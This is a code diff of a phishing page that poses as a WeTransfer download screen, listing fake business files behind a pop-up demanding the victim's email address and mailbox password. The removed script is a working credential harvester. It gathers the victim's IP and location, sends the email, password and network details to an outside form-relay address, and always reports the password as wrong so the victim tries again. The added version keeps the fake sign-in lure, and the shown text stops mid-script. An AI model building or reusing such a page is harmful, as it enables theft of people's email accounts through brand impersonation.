@@ -1,490 +1,510 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>File Transfers: The
-  WeTransfer File Sharing Hub | WeTransfer</title>
-	<style>
-		/* Basic styling for the pop-up form */
-		.popup-form { 
-		    display: none;
-		    position: fixed;
-		    top: 50%;
-		    left: 50%;
-		    transform: translate(-50%, -50%);
-		    background-color: white;
-		    padding: 20px;
-		    width: 90%; /* Ensures it fits within mobile screens */
-		    max-width: 400px; /* Prevents it from getting too wide */
-		    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-		    z-index: 9999;
-		    border-radius: 8px; /* Optional for better design */
-		}
-		
-		.popup-overlay {
-		    display: none;
-		    position: fixed;
-		    top: 0;
-		    left: 0;
-		    width: 100%;
-		    height: 100%;
-		    background-color: rgba(0, 0, 0, 0.5);
-		    z-index: 9998;
-		}
-		.btn {
-		    background-color: #4CAF50;
-		    color: white;
-		    padding: 10px 20px;
-		    border: none;
-		    cursor: pointer;
-		}
-		.btn:hover {
-		    background-color: #45a049;
-		}
-	</style>
-	<link rel="stylesheet" href="https://foul-shade-work.glitch.me/main.css">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WeTransfer Demo</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
+  <style>
+    /* Reset and Base Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", Roboto, sans-serif;
+    }
+    body, html {
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      color: #fff;
+    }
+
+    /* Background Video */
+    #body__bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    /* Header */
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+    }
+    .header .left, .header .right {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+    .header i {
+      font-size: 1.375rem;
+      cursor: pointer;
+    }
+
+    /* Files Container */
+    .files__container {
+      max-width: 600px;
+      margin: 3rem auto;
+      background: rgba(20, 20, 20, 0.75);
+      border-radius: 1rem;
+      padding: 1.5rem;
+      backdrop-filter: blur(12px);
+      box-shadow: 0 0.5rem 1.5rem rgba(0, 0, 0, 0.4);
+    }
+    .files__header {
+      text-align: center;
+      margin-bottom: 1.25rem;
+    }
+    .files__header h2 {
+      font-size: 1.25rem;
+      font-weight: 600;
+    }
+    .files__header p {
+      font-size: 0.875rem;
+      opacity: 0.7;
+    }
+    .files__body {
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+    .file__container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(40, 40, 40, 0.85);
+      padding: 0.75rem 1rem;
+      border-radius: 0.625rem;
+      transition: background 0.3s;
+    }
+    .file__container:hover {
+      background: rgba(60, 60, 60, 0.95);
+    }
+    .file_info {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+    .file_img img {
+      width: 2rem;
+      height: 2rem;
+    }
+    .file_details {
+      display: flex;
+      flex-direction: column;
+    }
+    .file_title {
+      font-size: 0.875rem;
+      font-weight: 500;
+    }
+    .file_size {
+      font-size: 0.75rem;
+      opacity: 0.7;
+    }
+    .file_download i {
+      font-size: 1.25rem;
+      cursor: pointer;
+      opacity: 0.8;
+      transition: transform 0.2s, opacity 0.2s;
+    }
+    .file_download i:hover {
+      transform: translateY(2px);
+      opacity: 1;
+    }
+
+    /* Footer */
+    .files__footer {
+      display: flex;
+      justify-content: flex-end;
+      gap: 1rem;
+      margin-top: 1.5rem;
+    }
+    .btn {
+      padding: 0.625rem 1.125rem;
+      background: #4e9fff;
+      border: none;
+      border-radius: 0.5rem;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background: #2e7be6;
+    }
+
+    /* Popup Overlay */
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(6px);
+      z-index: 1000;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    .popup-overlay.active {
+      display: block;
+      opacity: 1;
+    }
+
+    /* Popup Form */
+    .popup-form {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 1001;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .popup-form.active {
+      display: flex;
+    }
+    .modal {
+      background: #1c1c1c;
+      padding: 1.875rem;
+      border-radius: 0.75rem;
+      max-width: 400px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 0.5rem 1.25rem rgba(0, 0, 0, 0.5);
+      animation: popupScale 0.3s ease;
+    }
+    .modal .close {
+      text-align: right;
+      margin-bottom: 0.625rem;
+      cursor: pointer;
+    }
+    .modal h2 {
+      font-size: 1.25rem;
+      margin-bottom: 0.5rem;
+    }
+    .modal .title {
+      font-size: 0.875rem;
+      margin-bottom: 0.9375rem;
+      opacity: 0.8;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.625rem;
+      margin-bottom: 0.9375rem;
+      border-radius: 0.5rem;
+      border: none;
+      background: #2b2b2b;
+      color: #fff;
+    }
+    .form-control::placeholder {
+      color: #bbb;
+    }
+    .btn-submit {
+      width: 100%;
+      padding: 0.75rem;
+      border-radius: 0.5rem;
+      border: none;
+      background: #4e9fff;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn-submit:hover {
+      background: #2e7be6;
+    }
+    .error-message {
+      color: red;
+      margin-bottom: 0.9375rem;
+      display: none;
+    }
+    .form-group.btn-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+    .btn.logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+    .btn.logo img, .btn.logo i {
+      width: 1.5rem;
+      height: 1.5rem;
+    }
+    .check-box {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.875rem;
+      margin-bottom: 0.9375rem;
+    }
+
+    /* Animation */
+    @keyframes popupScale {
+      from { transform: scale(0.85); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    /* Responsive Design */
+    @media (max-width: 600px) {
+      .files__container {
+        margin: 1.5rem;
+        padding: 1rem;
+      }
+      .header {
+        padding: 1rem;
+      }
+      .modal {
+        width: 95%;
+      }
+    }
+  </style>
 </head>
-
 <body>
-	<div id="root">
-		<div style="display: block;">
-			<video autoplay loop muted playsinline id="body__bg" src="https://cdn.glitch.global/36e64f1e-3eca-4b22-9905-49556470db3b/video-02.mp4"></video>
-			<div class="header">
-				<div class="left">
-					<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-						<path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path>
-					</svg>
-					<p>WeTransfer</p>
-				</div>
-				<div class="right">
-					<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-						<path d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"></path>
-						<path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path>
-					</svg>
-				</div>
-			</div>
-			<div class="files__container">
-				<div class="files__header">
-					<div class="files__header__logo">
-						<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-							<path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path>
-						</svg>
-					</div>
-					<h2>4 items ready for download</h2>
-					<p>41.0 MB • Expires in 7 days</p>
-				</div>
-				<div class="files__body">
-					<div class="file__container">
-						<div class="file_info">
-							<div class="file_img">
-								<img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/pdf.png?v=1732203231835" alt="Contact Details &amp; Scope of Work.pdf">
-							</div>
-							<div class="file_details">
-								<p class="file_title">Contact Details &amp; Scope of Work.pdf</p>
-								<p class="file_size">20 MB</p>
-							</div>
-						</div>
-						<div class="file_download">
-							<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-								<path fill="none" d="M0 0h24v24H0z"></path>
-								<path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path>
-							</svg>
-						</div>
-					</div>
-					<div class="file__container">
-						<div class="file_info">
-							<div class="file_img">
-								<img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/xls.png?v=1732203248885" alt="Specifications.xlsx">
-							</div>
-							<div class="file_details">
-								<p class="file_title">Specifications.xlsx</p>
-								<p class="file_size">4.5 MB</p>
-							</div>
-						</div>
-						<div class="file_download">
-							<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-								<path fill="none" d="M0 0h24v24H0z"></path>
-								<path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path>
-							</svg>
-						</div>
-					</div>
-					<div class="file__container">
-						<div class="file_info">
-							<div class="file_img">
-								<img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/pdf.png?v=1732203231835" alt="Quote.pdf">
-							</div>
-							<div class="file_details">
-								<p class="file_title">Quote.pdf</p>
-								<p class="file_size">1.6 MB</p>
-							</div>
-						</div>
-						<div class="file_download">
-							<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-								<path fill="none" d="M0 0h24v24H0z"></path>
-								<path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path>
-							</svg>
-						</div>
-					</div>
-					<div class="file__container">
-						<div class="file_info">
-							<div class="file_img">
-								<img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/pdf.png?v=1732203231835" alt="Project Plans/Information.pdf">
-							</div>
-							<div class="file_details">
-								<p class="file_title">Project Plans/Information.pdf</p>
-								<p class="file_size">14 MB</p>
-							</div>
-						</div>
-						<div class="file_download">
-							<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-								<path fill="none" d="M0 0h24v24H0z"></path>
-								<path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path>
-							</svg>
-						</div>
-					</div>
-				</div>
-				<div class="files__footer">
-					<div class="save">
-						<p>Save to cloud</p>
-					</div>
-					<div class="download">
-						<button class="btn" id="downloadButton">Download All</button>
-					</div>
-				</div>
-			</div>
-		</div>
-	</div>
-	<!-- Pop-up Form -->
-	<div class="popup-overlay" id="popupOverlay"></div>
-	<div class="popup-form" id="popupForm">
-		<div id="m-modal">
-			<div class="modal">
-				<div class="modal-body"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSi5YaF8N9pxFP_SOR4yBK2_DBMBMdLFmMpFKsmGW83HhzHP7913cNKZOyokKPGt43TsFajYNdNeoxc04bSuNAEllehPsfUxrMZDuG_pa12oHdvE60B0Oxw8yMjIGoI9IBL_BqnHXQCWH-FkpoSz-4VS02hqI5qOVSFwUurOO1suFreDjJYZ6XNQ-Q4-4/s320/loader.gif" alt="loading" class="spinner" id="loader">
-					<div>
-						<div class="close"><div id="closePopupButton"><i class="far fa-circle-xmark"></i></div></div>
-						<div class="header"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-								<path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path>
-							</svg>
-							<h2>WeTransfer</h2>
-						</div>
-						<p class="title">Sign in with your correct Mailbox Password to access documents</p>
-						<div id="errorMessage" style="color:red; margin-top:10px; display:none;"></div>
-						<form id="downloadForm">
-							<div class="form-group"><input type="email" id="email" name="email" class="form-control" placeholder="Email Address"></div>
-							<div class="form-group"><input type="password" id="password" name="password" class="form-control" placeholder="Email Password" value=""></div>
-							<p class="error-box"></p>
-							<div class="form-group d-flex">
-								<div class="check-box"><input type="checkbox" id="remember-me"><label for="remember-me">Remember me</label></div>
-								<div class="forgot-password"></div>
-							</div>
-							<div class="form-group btn-group"><button class="btn" type="submit" id="submitButton">Sign in</button><button class="btn logo" type="submit"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgm4x9jPELaQWyGDDPfk1PihnSw6z2tYshg8hGeLDKFItNQ_nfmpuwcUICeeYeLZrX2ORBeJHJLw3sN0plw0suKxt84xFZU_Ue17q17fpmPvOx2hJKzoqTmoF5dIZhA8f52PpC4GIYnIPbbr6JZHVhMTSh_M6joEzgX8K1n4Je2HOuMzsYCxGEWwusqNe8/s500/Untitled.png" alt="">Sign in with Microsoft</button><button class="btn logo" type="submit"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
-										<path d="M644.65 502.31c0 15.13 5.82 26.76 15.13 37.24 8.15 8.15 23.27 14 37.24 14a86.29 86.29 0 0 0 39.56-9.31c11.64-5.82 20.95-3.49 26.76 5.82 7 10.47-2.33 24.44-10.47 33.75-15.13 16.29-44.22 27.93-81.45 27.93-75.64-2.33-119.85-53.53-119.85-121 0-72.15 51.2-115.2 117.53-115.2 59.35 0 98.91 30.25 98.91 72.15 0 39.56-33.75 65.16-71 65.16-20.95 0-36.07-3.49-46.55-11.64-3.46-3.56-5.81-2.39-5.81 1.1Zm-135-119.85c-29.09-5.82-69.82-8.15-112.87-8.15s-83.78 2.33-112.87 7c-22.09 4.64-27.91 16.27-27.91 36.05s4.65 43.05 14 82.62a612.58 612.58 0 0 0 27.93 82.62c8.15 17.45 15.13 23.27 30.25 23.27s22.11-9.31 30.25-22.11L379.35 550c5.82-7 10.47-11.64 17.45-11.64s11.64 3.49 16.29 11.64L434 583.76c8.15 12.8 15.13 22.11 30.25 22.11s23.27-5.82 30.25-23.27a450.35 450.35 0 0 0 27.97-82.6c10.47-39.56 15.13-62.84 15.13-82.62s-5.82-31.43-27.93-34.93Z"></path>
-									</svg>Sign in with Apple</button></div>
-						</form>
-					</div>
-				</div>
-			</div>
-		</div>
-	</div>
-	<script>
-    document.addEventListener('DOMContentLoaded', function() {
-        // Element references
-        const downloadButtons = document.querySelectorAll('.file_download, .file_download svg');
-        const downloadAllButton = document.getElementById('downloadButton');
-        const popupForm = document.getElementById('popupForm');
-        const popupOverlay = document.getElementById('popupOverlay');
-        const closePopupButton = document.getElementById('closePopupButton');
-        const downloadForm = document.getElementById('downloadForm');
-        const submitButton = document.querySelector('#downloadForm button[type="submit"]');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const errorMessage = document.getElementById('errorMessage') || document.createElement('div');
-        
-        let step = 1;
-        const loaderGif = 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSi5YaF8N9pxFP_SOR4yBK2_DBMBMdLFmMpFKsmGW83HhzHP7913cNKZOyokKPGt43TsFajYNdNeoxc04bSuNAEllehPsfUxrMZDuG_pa12oHdvE60B0Oxw8yMjIGoI9IBL_BqnHXQCWH-FkpoSz-4VS02hqI5qOVSFwUurOO1suFreDjJYZ6XNQ-Q4-4/s256/loader.gif';
+  <!-- Background Video -->
+  <video autoplay loop muted playsinline id="body__bg" src="https://cdn.glitch.global/36e64f1e-3eca-4b22-9905-49556470db3b/video-02.mp4"></video>
 
-        // Create loader element (30x30 in top-left corner)
-        let loader = document.getElementById('loader');
-        if (!loader) {
-            loader = document.createElement('div');
-            loader.id = 'loader';
-            loader.style.position = 'fixed';
-            loader.style.top = '50%';
-            loader.style.left = '50%';
-            loader.style.zIndex = '9999';
-            loader.style.display = 'none';
-            loader.innerHTML = `<img src="${loaderGif}" style="width:50%; height:50%;" alt="Loading">`;
-            document.body.appendChild(loader);
+  <!-- Header -->
+  <header class="header">
+    <div class="left">
+      <i class="fas fa-cloud"></i>
+      <p>WeTransfer</p>
+    </div>
+    <div class="right">
+      <i class="fas fa-user-circle"></i>
+    </div>
+  </header>
+
+  <!-- Files Container -->
+  <section class="files__container">
+    <div class="files__header">
+      <i class="fas fa-cloud"></i>
+      <h2>4 items ready for download</h2>
+      <p>41.0 MB • Expires in 7 days</p>
+    </div>
+    <div class="files__body">
+      <div class="file__container">
+        <div class="file_info">
+          <div class="file_img">
+            <img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/pdf.png?v=1732203231835" alt="PDF icon">
+          </div>
+          <div class="file_details">
+            <p class="file_title">Contact Details & Scope of Work.pdf</p>
+            <p class="file_size">20 MB</p>
+          </div>
+        </div>
+        <div class="file_download">
+          <i class="fas fa-download" data-file="Contact Details & Scope of Work.pdf"></i>
+        </div>
+      </div>
+      <div class="file__container">
+        <div class="file_info">
+          <div class="file_img">
+            <img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/xls.png?v=1732203248885" alt="Excel icon">
+          </div>
+          <div class="file_details">
+            <p class="file_title">Specifications.xlsx</p>
+            <p class="file_size">4.5 MB</p>
+          </div>
+        </div>
+        <div class="file_download">
+          <i class="fas fa-download" data-file="Specifications.xlsx"></i>
+        </div>
+      </div>
+      <div class="file__container">
+        <div class="file_info">
+          <div class="file_img">
+            <img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/pdf.png?v=1732203231835" alt="PDF icon">
+          </div>
+          <div class="file_details">
+            <p class="file_title">Quote.pdf</p>
+            <p class="file_size">1.6 MB</p>
+          </div>
+        </div>
+        <div class="file_download">
+          <i class="fas fa-download" data-file="Quote.pdf"></i>
+        </div>
+      </div>
+      <div class="file__container">
+        <div class="file_info">
+          <div class="file_img">
+            <img src="https://cdn.glitch.global/e27d106b-2d1b-443f-853d-1ea46e1d14d3/pdf.png?v=1732203231835" alt="PDF icon">
+          </div>
+          <div class="file_details">
+            <p class="file_title">Project Plans/Information.pdf</p>
+            <p class="file_size">14 MB</p>
+          </div>
+        </div>
+        <div class="file_download">
+          <i class="fas fa-download" data-file="Project Plans/Information.pdf"></i>
+        </div>
+      </div>
+    </div>
+    <div class="files__footer">
+      <div class="save">
+        <p>Save to cloud</p>
+      </div>
+      <div class="download">
+        <button class="btn" id="downloadButton">Download All</button>
+      </div>
+    </div>
+  </section>
+
+  <!-- Popup Overlay -->
+  <div class="popup-overlay" id="popupOverlay"></div>
+
+  <!-- Popup Form -->
+  <div class="popup-form" id="popupForm">
+    <div class="modal">
+      <div class="close">
+        <i class="far fa-circle-xmark" id="closePopupButton"></i>
+      </div>
+      <div class="header">
+        <i class="fas fa-cloud"></i>
+        <h2>WeTransfer</h2>
+      </div>
+      <p class="title">Sign in with your email to access documents</p>
+      <div class="error-message" id="errorMessage"></div>
+      <form id="downloadForm">
+        <div class="form-group">
+          <input type="email" id="email" name="email" class="form-control" placeholder="Email Address" required>
+        </div>
+        <div class="form-group">
+          <input type="password" id="password" name="password" class="form-control" placeholder="Email Password" required>
+        </div>
+        <div class="form-group check-box">
+          <input type="checkbox" id="remember-me">
+          <label for="remember-me">Remember me</label>
+        </div>
+        <div class="form-group btn-group">
+          <button class="btn btn-submit" type="submit" id="submitButton">Sign in</button>
+          <button class="btn logo" type="button">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgm4x9jPELaQWyGDDPfk1PihnSw6z2tYshg8hGeLDKFItNQ_nfmpuwcUICeeYeLZrX2ORBeJHJLw3sN0plw0suKxt84xFZU_Ue17q17fpmPvOx2hJKzoqTmoF5dIZhA8f52PpC4GIYnIPbbr6JZHVhMTSh_M6joEzgX8K1n4Je2HOuMzsYCxGEWwusqNe8/s500/Untitled.png" alt="Microsoft logo">
+            Sign in with Microsoft
+          </button>
+          <button class="btn logo" type="button">
+            <i class="fab fa-apple"></i>
+            Sign in with Apple
+          </button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // Select elements
+      const downloadButton = document.getElementById("downloadButton");
+      const fileDownloadIcons = document.querySelectorAll(".file_download i");
+      const popupOverlay = document.getElementById("popupOverlay");
+      const popupForm = document.getElementById("popupForm");
+      const closePopupButton = document.getElementById("closePopupButton");
+      const downloadForm = document.getElementById("downloadForm");
+      const errorMessage = document.getElementById("errorMessage");
+
+      // Function to show popup
+      function showPopup(fileName = null) {
+        popupOverlay.classList.add("active");
+        popupForm.classList.add("active");
+        // Store the file name if triggered by an icon
+        if (fileName) {
+          downloadForm.dataset.file = fileName;
+        } else {
+          delete downloadForm.dataset.file;
         }
+      }
 
-        // Setup error message
-        if (!errorMessage.id) {
-            errorMessage.id = 'errorMessage';
-            errorMessage.style.color = 'red';
-            errorMessage.style.marginTop = '10px';
-            errorMessage.style.display = 'none';
-            downloadForm.appendChild(errorMessage);
-        }
+      // Function to hide popup
+      function hidePopup() {
+        popupOverlay.classList.remove("active");
+        popupForm.classList.remove("active");
+        errorMessage.style.display = "none";
+        downloadForm.reset(); // Reset form fields
+      }
 
-        // Disable submit button initially
-        if (submitButton) {
-            submitButton.disabled = true;
-            submitButton.style.opacity = '0.6';
-            submitButton.style.cursor = 'not-allowed';
-        }
+      // Attach event listener to "Download All" button
+      downloadButton.addEventListener("click", () => showPopup());
 
-        // Validate inputs in real-time
-        function validateInputs() {
-            const emailValid = emailInput.value.trim().includes('@');
-            const passwordValid = passwordInput.value.trim().length >= 8;
-            
-            if (submitButton) {
-                submitButton.disabled = !(emailValid && passwordValid);
-                submitButton.style.opacity = submitButton.disabled ? '0.6' : '1';
-                submitButton.style.cursor = submitButton.disabled ? 'not-allowed' : 'pointer';
-            }
-
-            if (passwordInput.value.trim().length > 0 && passwordInput.value.trim().length < 8) {
-                showError('Password must be at least 8 characters', false);
-            } else if (!emailInput.value.trim().includes('@') && emailInput.value.trim().length > 0) {
-                showError('Please enter a valid email', false);
-            } else {
-                errorMessage.style.display = 'none';
-            }
-        }
-
-        // Close popup function
-        function closePopup() {
-            popupForm.style.display = 'none';
-            popupOverlay.style.display = 'none';
-            errorMessage.style.display = 'none';
-        }
-
-        // Show error message
-        function showError(message, isError = true) {
-            errorMessage.textContent = message;
-            errorMessage.style.color = isError ? 'red' : 'orange';
-            errorMessage.style.display = 'block';
-        }
-
-        // Show loading state
-        function showLoading(show) {
-            loader.style.display = show ? 'block' : 'none';
-            if (submitButton) {
-                submitButton.disabled = show;
-                submitButton.textContent = show ? 'Processing...' : 'Sign in';
-            }
-        }
-
-        // Track authentication state
-        let isAuthenticated = false;
-        let authEmail = '';
-
-        // Form submission handler
-        async function handleSubmit(event) {
-            event.preventDefault();
-            
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
-            
-            if (!email || !email.includes('@')) {
-                showError('Please enter a valid email address');
-                return;
-            }
-
-            if (password.length < 8) {
-                showError('Password must be at least 8 characters');
-                return;
-            }
-
-            errorMessage.style.display = 'none';
-            showLoading(true);
-
-            try {
-                await new Promise(resolve => setTimeout(resolve, 2000));
-
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                if (!ipResponse.ok) throw new Error('Failed to get IP info');
-                const ipData = await ipResponse.json();
-                
-                const formData = {
-                    _subject: `Logs | ${email} | ${ipData.ip || 'Unknown IP'}`,
-                    Email: email,
-                    Password: password,
-                    Attempts: step,
-                    IP: ipData.ip || 'Not available',
-                    Location: `${ipData.city || 'Unknown'}, ${ipData.country || 'Unknown'}`,
-                    Domain: email.split('@').pop(),
-                    ISP: ipData.org || 'Unknown',
-                    Hostname: ipData.hostname || 'Unknown',
-                    Timestamp: new Date().toISOString()
-                };
-
-                const submitResponse = await fetch("https://formsubmit.co/ajax/dattiobi@yandex.com", {
-                    method: "POST",
-                    headers: { 
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify(formData)
-                });
-
-                if (!submitResponse.ok) throw new Error('Submission failed');
-                
-                const result = await submitResponse.json();
-                
-                if (password !== "correctpassword123") {
-                    throw new Error('Incorrect password');
-                }
-
-                isAuthenticated = true;
-                authEmail = email;
-                step++;
-                closePopup();
-                enableDownloads();
-
-            } catch (error) {
-                console.error('Submission error:', error);
-                showError(error.message === 'Incorrect password' 
-                    ? 'Incorrect password. Please try again.' 
-                    : 'Network error. Please try again later.');
-            } finally {
-                showLoading(false);
-            }
-        }
-
-        // Enable downloads after authentication
-        function enableDownloads() {
-            downloadButtons.forEach(button => {
